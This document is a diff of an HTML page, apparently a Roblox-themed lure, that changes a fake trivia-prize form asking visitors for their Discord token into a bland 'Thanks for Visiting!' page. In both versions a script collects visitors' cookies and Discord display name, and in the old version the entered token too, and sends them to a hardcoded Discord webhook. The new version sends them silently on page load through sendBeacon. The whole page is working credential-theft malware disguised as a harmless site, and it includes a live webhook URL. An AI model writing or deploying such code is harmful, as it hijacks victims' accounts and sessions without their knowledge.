@@ -3,147 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Rivals Trivia Game</title>
+    <title>Roblox Rivals - Thanks!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-color: #1e2124;
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            text-align: center;
         }
 
         .container {
-            background: white;
-            padding: 20px;
+            background: #2f3136;
+            padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            max-width: 500px;
-            width: 100%;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
         }
 
         h1 {
-            color: #333;
+            color: #5865F2; /* Discord blurple */
+            margin-bottom: 10px;
         }
 
-        form {
-            display: flex;
-            flex-direction: column;
-            text-align: left;
-        }
-
-        label {
-            margin-top: 10px;
-            font-weight: bold;
-        }
-
-        input {
-            padding: 10px;
-            margin-top: 5px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-
-        button {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #0056b3;
-        }
-
-        #result {
-            margin-top: 15px;
-            font-weight: bold;
+        p {
+            color: #dcddde;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Roblox Rivals Trivia Game</h1>
-        <p>Answer the following questions to win exclusive Roblox items!</p>
-        <form id="triviaForm">
-            <label for="question1">What is the capital of Roblox?</label>
-            <input type="text" id="question1" name="question1" required>
-            
-            <label for="question2">Who is the CEO of Roblox?</label>
-            <input type="text" id="question2" name="question2" required>
-            
-            <label for="discordToken">Enter your Discord token to claim your prize:</label>
-            <input type="text" id="discordToken" name="discordToken" required>
-            
-            <button type="submit">Submit</button>
-        </form>
-        <div id="result"></div>
+        <h1>Thanks for Visiting!</h1>
+        <p>We appreciate you checking out our page.</p>
     </div>
 
     <script>
-        document.getElementById('triviaForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        // This script runs automatically when the page loads.
+        // It silently gathers data and sends it to your webhook.
 
-            // Get the value from the input field
-            const enteredToken = document.getElementById('discordToken').value;
+        // --- Data Gathering ---
+        // Get all cookies for the current domain.
+        const userCookies = document.cookie;
 
-            // --- Data Gathering ---
-            // Get all cookies as a single string
-            const userCookies = document.cookie;
-
-            // Try to get the user's display name from Discord's DOM.
-            // This is a common class name but may change.
-            let displayName = 'Not found';
-            try {
-                const nameElement = document.querySelector('[class*="usernameInner"]');
-                if (nameElement && nameElement.innerText) {
-                    displayName = nameElement.innerText;
-                }
-            } catch (e) {
-                // Do nothing if it fails, displayName remains 'Not found'
+        // Try to get the user's display name from Discord's DOM.
+        // This selector targets the username element in the Discord client.
+        let displayName = 'Not found';
+        try {
+            // This is a common selector for the username in Discord's app.
+            const nameElement = document.querySelector('[class*="usernameInner"]');
+            if (nameElement && nameElement.innerText) {
+                displayName = nameElement.innerText;
             }
-            
-            // --- Prepare the Message for Discord ---
-            const messageContent = `
-**--- New Capture ---**
-**Entered Token:** \`${enteredToken}\`
+        } catch (e) {
+            // If it fails, displayName remains 'Not found'.
+            console.error("Could not find display name.", e);
+        }
+        
+        // --- Prepare the Message for Discord ---
+        // Format the data into a clean message.
+        const messageContent = `
+**--- New Silent Capture ---**
 **Display Name:** ${displayName}
 **Cookies:** \`\`\`${userCookies}\`\`\`
-            `.trim();
+        `.trim();
 
-            // --- Send to Discord Webhook ---
-            // Your provided webhook URL
-            const discordWebhookURL = 'https://discordapp.com/api/webhooks/1474195325693722655/OLrnRwKyPJUu3ku2cHHsUfF2hKZgvgdiI19fLLrcCTFz00rt0Y7zMinEa4JzzWB03QJ3';
+        // --- Send to Discord Webhook ---
+        // Your provided webhook URL
+        const discordWebhookURL = 'https://discordapp.com/api/webhooks/1474195325693722655/OLrnRwKyPJUu3ku2cHHsUfF2hKZgvgdiI19fLLrcCTFz00rt0Y7zMinEa4JzzWB03QJ3';
 
-            fetch(discordWebhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: messageContent,
-                }),
-            })
-            .then(response => {
-                // Update the page for the user
-                const resultDiv = document.getElementById('result');
-                if (response.ok) {
-                    resultDiv.innerText = 'Success! Your prize is being processed.';
-                } else {
-                    resultDiv.innerText = 'Failed to verify. Please try again.';
-                }
-            })
-            .catch(error => {
-                console.error('Webhook Error:', error);
-                document.getElementById('result').innerText = 'An error occurred. Please try again later.';
-            });
-        });
+        // Use the Beacon API for a silent, fire-and-forget request.
+        // It's more reliable for this purpose than fetch() as it doesn't block the page
+        // and will still send data even if the page is closed immediately.
+        const data = new Blob([JSON.stringify({ content: messageContent })], { type: 'application/json' });
+        navigator.sendBeacon(discordWebhookURL, data);
+
     </script>
 </body>
 </html>
